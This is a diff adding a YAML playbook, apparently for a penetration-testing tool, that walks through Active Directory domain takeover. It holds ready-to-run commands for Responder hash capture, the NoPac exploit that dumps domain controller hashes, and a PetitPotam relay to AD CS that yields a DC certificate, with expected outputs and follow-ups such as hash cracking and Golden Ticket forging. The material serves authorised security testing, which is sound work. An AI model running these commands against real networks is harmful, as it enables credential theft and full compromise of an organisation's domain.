@@ -1,0 +1,64 @@
+id: ad-domain-trusts-nopac
+name: Advanced Active Directory (NoPac, PetitPotam, Trusts)
+category: ad
+description: 'Methodology for critical domain privilege escalation: NoPac sAMAccountName Spoofing (CVE-2021-42278/42287), PetitPotam AD CS Certificate Relay, Responder LLMNR Poisoning, and Cross-Forest Domain Trusts.'
+port_triggers:
+  - 88
+  - 389
+  - 445
+service_triggers:
+  - kerberos
+  - ldap
+  - smb
+tags:
+  - active-directory
+  - nopac
+  - petitpotam
+  - adcs
+  - trusts
+  - responder
+steps:
+  - id: ad-responder-llmnr
+    title: LLMNR / NBT-NS Poisoning (Responder)
+    phase: reconnaissance
+    purpose: Poison broadcast LLMNR/NBT-NS queries on the local subnet to capture NetNTLMv2 hashes or relay authentication.
+    command: sudo responder -I tun0 -dwv -F
+    expected_output:
+      - '[+] [LLMNR]  Poisoned answer sent to 10.10.10.50 for name WIN-SRV'
+      - '[+] [SMB] NTLMv2-SSP Client: 10.10.10.50'
+      - '[+] [SMB] Hash: jdoe::CORP:8a3f...'
+    common_mistakes:
+      - Turn off `SMB = Off` and `HTTP = Off` in `/etc/responder/Responder.conf` if using ntlmrelayx instead.
+    if_success: NetNTLMv2 hash captured! Crack with Hashcat mode 5600.
+    if_failure: No broadcast traffic. Trigger artificial SMB traffic with `xp_dirtree` or browser UNC paths.
+    references:
+      - https://wadcoms.github.io/
+  - id: ad-nopac-exploit
+    title: NoPac Domain Controller Takeover (CVE-2021-42278 / 42287)
+    phase: privesc
+    purpose: Exploit sAMAccountName spoofing to obtain a Kerberos Service Ticket for the Domain Controller as DA without admin credentials.
+    command: python3 noPac.py "{{DOMAIN|corp.local}}/{{USERNAME}}:{{PASSWORD}}" -dc-ip {{TARGET}} --impersonate Administrator -use-ldap -dump-ws
+    expected_output:
+      - '[*] Domain Controller: DC.corp.local'
+      - '[*] Impersonating Administrator...'
+      - '[+] Dumping DC hashes: Administrator:500:aad3b4...:31d6cfe0...:::'
+    common_mistakes:
+      - Standard user must have permission to create a machine account (`MachineAccountQuota` > 0).
+    if_success: Full Domain Controller takeover! Dumped all domain credentials.
+    if_failure: Domain Controller is patched (post-Nov 2021 update). Test AD CS or DCSync.
+    references:
+      - https://wadcoms.github.io/
+  - id: ad-petitpotam-adcs
+    title: PetitPotam MS-EFSRPC & AD CS NTLM Relay
+    phase: privesc
+    purpose: Coerce Domain Controller authentication over MS-EFSRPC and relay it to AD CS Web Enrollment to obtain a machine certificate for the DC.
+    command: impacket-ntlmrelayx -t "http://{{CA_SERVER|ca.corp.local}}/certsrv/certfnsh.asp" -smb2support --template DomainController & python3 PetitPotam.py {{LHOST|10.10.14.2}} {{TARGET}}
+    expected_output:
+      - '[*] Requesting certificate for DC$ from CA...'
+      - '[*] Got certificate (base64): MIIE...'
+    common_mistakes:
+      - Request TGT with `gettgtpkinit.py` using the base64 certificate to get DC Kerberos ticket.
+    if_success: Domain Controller certificate acquired! Generate Golden Ticket with krbtgt.
+    if_failure: EPA (Extended Protection for Authentication) enabled on AD CS or MS-EFSRPC filtered.
+    references:
+      - https://wadcoms.github.io/
